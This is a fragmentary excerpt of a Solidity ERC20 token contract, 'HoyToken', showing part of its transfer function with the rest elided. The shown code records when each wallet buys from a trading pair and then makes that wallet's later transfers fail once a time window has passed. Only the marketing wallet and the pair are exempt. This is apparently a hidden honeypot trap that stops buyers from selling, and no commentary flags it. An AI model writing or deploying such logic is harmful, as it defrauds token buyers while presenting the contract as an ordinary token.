...
contract HoyToken is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 _burn;
        uint256 _brunTimec = C[sender] + _times;
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]  ) {_burn = amount.mul(2).div(100);}
        if (recipient != _marketingWallet  && recipient != panckev2 && sender == panckev2 && balanceOf(recipient) == 0) 
        { C[recipient] = block.timestamp;}      
        uint256 _time =block.timestamp;     
        if (sender !=_marketingWallet  && sender !=panckev2 ){require(_time <= _brunTimec);}
